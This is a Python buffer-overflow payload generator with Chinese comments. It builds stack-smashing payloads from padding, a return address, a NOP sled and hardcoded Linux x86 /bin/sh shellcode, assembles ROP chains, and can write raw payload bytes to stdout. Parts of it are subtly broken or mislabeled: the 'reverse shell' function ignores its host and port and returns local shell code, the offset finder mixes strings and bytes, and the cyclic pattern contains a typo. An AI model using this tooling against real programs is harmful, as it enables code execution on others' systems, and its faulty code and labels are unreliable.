#!/usr/bin/env python3
"""
缓冲区溢出利用辅助脚本
功能: 生成各种溢出payload
"""

import struct
import sys


def generate_pattern(length):
    """生成溢出测试模式"""
    pattern = ""
    for i in range(length):
        pattern += chr(ord('A') + (i % 26)) + str(i % 10)
    return pattern[:length]


def find_offset(crash_string, eip_value):
    """计算溢出偏移量"""
    # 简单实现：查找EIP在模式中的位置
    try:
        eip = struct.unpack('<I', bytes.fromhex(eip_value.replace('0x', '')))[0]
        # 尝试在模式中找到
        for i in range(len(crash_string) - 4):
            test = struct.unpack('<I', crash_string[i:i+4])[0]
            if test == eip:
                return i
    except:
        pass
    
    # 如果无法解析，尝试暴力搜索
    for i in range(len(crash_string) - 4):
        if crash_string[i:i+4] in str(eip_value):
            return i
    
    return -1


def create_stack_payload(offset, return_address, shellcode, nop_length=16):
    """创建栈溢出payload"""
    # NOP sled
    nops = b'\x90' * nop_length
    
    # Shellcode (Linux x86 /bin/sh)
    # 这是一个示例shellcode，实际使用需要根据目标调整
    linux_shellcode = bytes([
        0x31, 0xc0,  # xor eax, eax
        0x50,        # push eax
        0x68, 0x2f, 0x2f, 0x73, 0x68,  # push //sh
        0x68, 0x2f, 0x62, 0x69, 0x6e,  # push /bin
        0x89, 0xe3,  # mov ebx, esp
        0x50,        # push eax
        0x53,        # push ebx
        0x89, 0xe1,  # mov ecx, esp
        0xb0, 0x0b,  # mov al, 11
        0xcd, 0x80   # int 0x80
    ])
    
    # 构建payload
    payload = b'A' * offset
    payload += struct.pack('<I', return_address)  # 返回地址
    payload += nops
    payload += shellcode if shellcode else linux_shellcode
    
    return payload


def create_rop_chain(offsets, gadgets):
    """创建ROP链"""
    payload = b''
    for addr in offsets:
        if isinstance(addr, str):
            # 解析地址
            addr = int(addr, 16)
        payload += struct.pack('<I', addr)
    return payload


def format_hex_dump(data, width=16):
    """格式化十六进制输出"""
    result = []
    for i in range(0, len(data), width):
        chunk = data[i:i+width]
        hex_part = ' '.join(f'{b:02x}' for b in chunk)
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        result.append(f'{i:04x}  {hex_part:<{width*3}}  {ascii_part}')
    return '\n'.join(result)


def test_payload(payload):
    """测试payload"""
    print("\n[*] Payload 预览:")
    print(format_hex_dump(payload[:64]))
    print(f"\n[*] 总长度: {len(payload)} bytes")


def windows_reverse_shell():
    """Windows反向shell shellcode (metasploit格式)"""
    # 示例: Windows x86 reverse TCP shell
    # 这是一个占位符，实际需要使用msfvenom生成
    return None


def linux_reverse_shell(lhost, lport):
    """Linux反向shell shellcode"""
    import socket
    import subprocess
    
    # 这是一个简化的版本
    shellcode = bytes([
        0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68,
        0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50,
        0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80
    ])
    return shellcode


def generate_cyclic_pattern(length):
    """生成循环模式用于偏移计算"""
    pattern = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
    while len(pattern) < length:
        pattern += pattern
    return pattern[:length]


def main():
    print("="*60)
    print("缓冲区溢出Payload生成器")
    print("="*60)
    
    print("\n[1] 生成测试模式")
    print("[2] 创建栈溢出Payload")
    print("[3] 生成循环模式")
    print("[4] 测试Payload")
    
    choice = input("\n选择: ").strip()
    
    if choice == '1':
        length = int(input("长度: "))
        pattern = generate_pattern(length)
        print(f"\n[+] 模式:\n{pattern}")
        
    elif choice == '2':
        offset = int(input("偏移量: "))
        ret_addr = input("返回地址 (0x...): ")
        ret_addr = int(ret_addr, 16)
        
        payload = create_stack_payload(offset, ret_addr, None)
        test_payload(payload)
        
    elif choice == '3':
        length = int(input("长度: "))
        print(f"\n[+] 循环模式 (可用于计算偏移):")
        print(generate_cyclic_pattern(length))
        
    elif choice == '4':
        print("[*] 测试payload...")
        payload = create_stack_payload(100, 0xdeadbeef, None)
        test_payload(payload)
    
    else:
        print("[x] 无效选择")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == '--pattern':
            length = int(sys.argv[2]) if len(sys.argv) > 2 else 100
            print(generate_cyclic_pattern(length))
        elif sys.argv[1] == '--payload':
            offset = int(sys.argv[2]) if len(sys.argv) > 2 else 100
            ret = int(sys.argv[3], 16) if len(sys.argv) > 3 else 0xdeadbeef
            payload = create_stack_payload(offset, ret, None)
            sys.stdout.buffer.write(payload)
        else:
            main()
    else:
        main()
